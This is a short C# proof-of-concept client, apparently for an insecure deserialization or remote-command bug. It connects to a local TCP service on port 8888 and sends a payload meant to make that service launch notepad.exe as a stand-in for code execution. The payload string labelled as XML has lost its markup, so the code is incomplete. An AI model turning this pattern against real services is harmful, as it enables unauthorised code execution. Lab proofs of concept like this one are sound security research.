using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using SysProc;


namespace POC
{
    class Program
    {
        class DataSender
        {
            public static void Main()
            {
                //Process p = new Process("MsPaint", "System32", 30);
                string serverIp = "127.0.0.1";
                TcpClient client = new TcpClient(serverIp, 8888);


                string xmlString = @"
                Start
                notepad.exe
                ";

                NetworkStream strm = client.GetStream();
                byte[] dataSend = System.Text.Encoding.UTF8.GetBytes(xmlString);
                strm.Write(dataSend, 0, dataSend.Length);

                byte[] data = new byte[256];
                int bytes = strm.Read(data, 0, data.Length);
                string message = Encoding.UTF8.GetString(data, 0, bytes);
                Console.WriteLine(message);



                strm.Close();
                client.Close();
                Console.ReadKey();
            }
        }
    }
}
